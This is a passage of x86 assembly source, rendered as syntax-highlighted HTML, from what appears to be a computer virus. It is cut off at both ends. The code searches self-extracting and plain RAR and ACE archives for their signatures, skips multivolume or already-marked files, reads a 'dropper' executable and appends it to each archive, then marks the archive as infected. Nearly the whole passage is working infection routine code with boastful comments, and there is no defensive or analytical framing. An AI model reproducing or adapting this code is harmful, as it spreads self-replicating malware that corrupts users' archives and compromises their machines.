        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_nCompare</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">0002h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;ecx=bytes to read</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">0004h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;esi=file pos</span><span class="sc0">

        </span><span class="sc1">; now, i will read datas</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fMemory</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;allocated place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">            </span><span class="sc1">;i can't check error!</span><span class="sc0">

        </span><span class="sc1">; prepare to scan</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;end of memory buffer</span><span class="sc0">
    </span><span class="sc5">__iSFX_search_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__iSFX_search_1</span><span class="sc0">

        </span><span class="sc1">; search archive's signatures</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAR_Magic</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;no, esi=RAR_Magic</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">RAR_Magic_Length</span><span class="sc0">        </span><span class="sc1">;and its size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_nCompare</span><span class="sc4">],</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__iSFX_s2_continue</span><span class="sc0">      </span><span class="sc1">;is it really RAR ?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACE_Magic</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;esi=ACE_Magic</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ACE_Magic_Length</span><span class="sc0">        </span><span class="sc1">;and its size</span><span class="sc0">
    </span><span class="sc5">__iSFX_s2_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">           </span><span class="sc1">;compare magics</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iSFX_search_2</span><span class="sc0">     </span><span class="sc1">;shit, we must search on other place</span><span class="sc0">

        </span><span class="sc1">; position on header's start</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">RAR_Magic_Length</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_nCompare</span><span class="sc4">],</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__iSFX_h_read</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">ACE_Magic_Length</span><span class="sc4">-</span><span class="sc5">RAR_Magic_Length</span><span class="sc0">
    </span><span class="sc5">__iSFX_h_read</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; check multivolume flag</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_nCompare</span><span class="sc4">],</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__iSFX_mf_rar</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ACEhHeadFlags</span><span class="sc4">-</span><span class="sc5">ACE_h_struct</span><span class="sc4">],</span><span class="sc2">2048</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iSFX_mf_finish</span><span class="sc0">
    </span><span class="sc5">__iSFX_mf_rar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">RARFileFlags</span><span class="sc4">-</span><span class="sc5">RARSignature</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc5">__iSFX_mf_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iSFX_sEnd</span><span class="sc0">

        </span><span class="sc1">; call "child" functions, set certain input parameters</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;modify handle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_Type</span><span class="sc4">],</span><span class="sc5">__iACR_tRAR</span><span class="sc0">   </span><span class="sc1">;yeah, RAR archive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_nCompare</span><span class="sc4">],</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__iSFX_cc_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_Type</span><span class="sc4">],</span><span class="sc5">__iACR_tACE</span><span class="sc0">   </span><span class="sc1">;yeah, ACE archive</span><span class="sc0">
    </span><span class="sc5">__iSFX_cc_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fHandle</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;check whether SFX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_archive_infected</span><span class="sc0">      </span><span class="sc1">;archive has been</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iSFX_fClose</span><span class="sc0">           </span><span class="sc1">;infected</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__iACR_child_function</span><span class="sc0">       </span><span class="sc1">;call main function</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iSFX_finish</span><span class="sc0">           </span><span class="sc1">;to infect ACE or RAR</span><span class="sc0">

    </span><span class="sc5">__iSFX_sEnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__iSFX_fClose</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__iSFX_fClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iSFX_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">
    </span><span class="sc5">__iSFX_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ infection in ACE, RAR archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function infects ACE and RAR archivez. Unfortunately</span><span class="sc0">
        </span><span class="sc1">;I can't my dropper place inside archive 'cause if archive</span><span class="sc0">
        </span><span class="sc1">;is solid type resulting archive won't okay. Yes, this was</span><span class="sc0">
        </span><span class="sc1">;shock for me. But if archive isn't solid all will be okay</span><span class="sc0">
        </span><span class="sc1">;althrough this method is not support here. So, my dropper</span><span class="sc0">
        </span><span class="sc1">;is compressed but in the end of file.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    filename_ptr ... pointer to an ARJ's filename</span><span class="sc0">
        </span><span class="sc1">;        NewARJ struc ... has been filled? I dont know!</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  output:   nothing</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__iACR_fHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's handle</span><span class="sc0">
        </span><span class="sc5">__iACR_dHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's handle</span><span class="sc0">
        </span><span class="sc5">__iACR_dMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's body</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__iACR_Type</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;ACE or RAR ?</span><span class="sc0">
        </span><span class="sc5">__iACR_tACE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;ACE signature</span><span class="sc0">
        </span><span class="sc5">__iACR_tRAR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">;RAR signature</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_ACE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_Type</span><span class="sc4">],</span><span class="sc5">__iACR_tACE</span><span class="sc0">   </span><span class="sc1">;yeah, ACE archive</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_ACR</span><span class="sc0">
</span><span class="sc5">infect_RAR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_Type</span><span class="sc4">],</span><span class="sc5">__iACR_tRAR</span><span class="sc0">   </span><span class="sc1">;yeah, RAR archive</span><span class="sc0">

        </span><span class="sc1">; here, common functions is starting...</span><span class="sc0">
</span><span class="sc5">infect_ACR</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; check whether dropper exists</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_Type</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get archive type</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">AProgram</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">NewACE.dropper</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iACR_finish</span><span class="sc0">       </span><span class="sc1">;does dropper exists ?</span><span class="sc0">

        </span><span class="sc1">; open archive file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iACR_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; check whether archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_archive_infected</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iACR_fClose</span><span class="sc0">

        </span><span class="sc1">; read archive header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iACR_Type</span><span class="sc4">],</span><span class="sc5">__iACR_tACE</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__iACR_rar_1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACE_h_struct</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ACENeededBytes</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iACR_end_1</span><span class="sc0">
    </span><span class="sc5">__iACR_rar_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARSignature</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">RARSignature_Length</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc5">RARNeededBytes</span><span class="sc0">  </span><span class="sc1">;number of bytes to read</span><span class="sc0">

    </span><span class="sc5">__iACR_end_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iACR_fClose</span><span class="sc0">

        </span><span class="sc1">; check archive's header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iACR_Type</span><span class="sc4">],</span><span class="sc5">__iACR_tACE</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__iACR_rar_2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEhSignature</span><span class="sc4">],</span><span class="sc12">'CA**'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iACR_fClose</span><span class="sc0">       </span><span class="sc1">;the 1st part of sign</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEhSignature</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc12">'*E'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iACR_fClose</span><span class="sc0">       </span><span class="sc1">;the 2nd part</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEhHeadFlags</span><span class="sc4">],</span><span class="sc2">2048</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iACR_fClose</span><span class="sc0">       </span><span class="sc1">;multivolume flag ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iACR_end_2</span><span class="sc0">
    </span><span class="sc5">__iACR_rar_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARSignature</span><span class="sc4">],</span><span class="sc12">'!raR'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iACR_fClose</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARSignature</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc2">071Ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iACR_fClose</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARFileFlags</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iACR_fClose</span><span class="sc0">       </span><span class="sc1">;multivolume flag ?</span><span class="sc0">
    </span><span class="sc5">__iACR_end_2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; open dropper file</span><span class="sc0">
    </span><span class="sc5">__iACR_child_function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_Type</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get archive type</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">AProgram</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">NewACE.dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;once again test:</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iACR_finish</span><span class="sc0">       </span><span class="sc1">;does dropper exists ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iACR_fClose</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_dHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get dropper's file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; allocate memory for dropper's file body</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_dMemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read whole dropper's body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_dMemory</span><span class="sc4">]</span><span class="sc1">;destination buffer</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_dHandle</span><span class="sc4">]</span><span class="sc1">;dropper's handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iACR_dClose</span><span class="sc0">

        </span><span class="sc1">; get archive file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; "update" archive file by my dropper</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iACR_Type</span><span class="sc4">],</span><span class="sc5">__iACR_tACE</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__iACR_rar_3</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ACEhHeadSize</span><span class="sc4">-</span><span class="sc5">ACE_h_struct</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iACR_end_3</span><span class="sc0">
    </span><span class="sc5">__iACR_rar_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">RARHeaderSize</span><span class="sc4">-</span><span class="sc5">RARSignature</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RARSignature_Length</span><span class="sc0">

    </span><span class="sc5">__iACR_end_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;header take away</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;without main header, please</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">       </span><span class="sc1">;write my dropper, uaaah :)</span><span class="sc0">

        </span><span class="sc1">; archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__set_archive_infected</span><span class="sc0">

    </span><span class="sc5">__iACR_dClose</span><span class="sc4">:</span><span class="sc0">
